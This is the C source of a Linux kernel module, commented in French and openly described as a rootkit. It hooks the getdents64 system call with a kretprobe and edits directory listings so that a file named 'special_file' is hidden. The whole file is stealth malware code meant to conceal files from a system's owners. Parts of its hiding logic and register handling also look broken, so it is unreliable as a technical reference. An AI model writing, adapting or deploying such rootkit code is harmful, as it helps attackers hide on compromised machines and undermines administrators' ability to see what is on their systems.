#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/uaccess.h>
#include <linux/dirent.h>
#include <linux/errno.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("gogoliomax");
MODULE_DESCRIPTION("Rootkit utilisant kretprobe pour cacher un fichier");

// Nom du fichier à cacher
#define HIDE_FILE_NAME "special_file"

// Structure pour la kretprobe
static struct kretprobe my_kretprobe;

// Taille maximale du buffer temporaire
#define MAX_BUFFER_SIZE 256

// Prototype de la fonction de post-handler
static int ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs);

// Fonction appelée après le retour de getdents64
static int ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent;
    struct linux_dirent64 *entry, *prev = NULL;
    unsigned long offset = 0;
    int ret = regs_return_value(regs);

    // Vérification de la valeur de retour
    if (ret <= 0) {
        pr_info("Aucune donnée à traiter ou erreur syscall: %d\n", ret);
        return 0;
    }

    dirent = (struct linux_dirent64 __user *)regs->di;

    // Vérifier l'adresse utilisateur avant la copie
    if (!access_ok(dirent, ret)) {
        pr_err("Adresse utilisateur invalide\n");
        return -EFAULT;
    }

    // Allouer un buffer temporaire pour lire les entrées
    char *buffer = kmalloc(ret, GFP_KERNEL);
    if (!buffer) {
        pr_err("Erreur lors de l'allocation du buffer\n");
        return -ENOMEM;
    }

    // Copier les données utilisateur dans le buffer kernel
    if (copy_from_user(buffer, dirent, ret)) {
        pr_err("Erreur lors de la copie des données de l'utilisateur\n");
        kfree(buffer);
        return -EFAULT;
    }

    // Afficher les fichiers présents avant modification
    pr_info("Fichiers dans le répertoire avant modification :\n");
    entry = (struct linux_dirent64 *)buffer;
    offset = 0;
    while (offset < ret) {
        pr_info(" - %s\n", entry->d_name);
        offset += entry->d_reclen;
        entry = (struct linux_dirent64 *)(buffer + offset);
    }

    // Parcourir les entrées du répertoire pour cacher le fichier spécifié
    entry = (struct linux_dirent64 *)buffer;
    offset = 0;
    while (offset < ret) {
        if (strcmp(entry->d_name, HIDE_FILE_NAME) == 0) {
            // Masquer l'entrée en modifiant les offsets
            pr_info("Fichier caché : %s\n", entry->d_name);
            if (prev)
                prev->d_reclen += entry->d_reclen;
            else
                ret -= entry->d_reclen;
        } else {
            prev = entry;
        }

        offset += entry->d_reclen;
        entry = (struct linux_dirent64 *)(buffer + offset);
    }

    // Copier le buffer modifié vers l'espace utilisateur
    if (copy_to_user(dirent, buffer, ret)) {
        pr_err("Erreur lors de la copie des données dans l'espace utilisateur\n");
        kfree(buffer);
        return -EFAULT;
    }

    kfree(buffer);

    // Modifier la valeur de retour pour refléter la nouvelle taille des données
    regs_set_return_value(regs, ret);
    pr_info("Traitement terminé, taille finale des données : %d\n", ret);

    return 0;
}

// Initialisation de la kretprobe
static int __init kretprobe_init(void)
{
    my_kretprobe.handler = ret_handler;
    my_kretprobe.kp.symbol_name = "__x64_sys_getdents64"; // Cible : syscall getdents64

    // Enregistrer la kretprobe
    int ret = register_kretprobe(&my_kretprobe);
    if (ret < 0) {
        pr_err("Erreur lors de l'enregistrement de la kretprobe: %d\n", ret);
        return ret;
    }

    pr_info("kretprobe enregistrée avec succès.\n");
    return 0;
}

// Nettoyage lors de la décharge du module
static void __exit kretprobe_exit(void)
{
    unregister_kretprobe(&my_kretprobe);
    pr_info("kretprobe déchargée.\n");
}

module_init(kretprobe_init);
module_exit(kretprobe_exit);

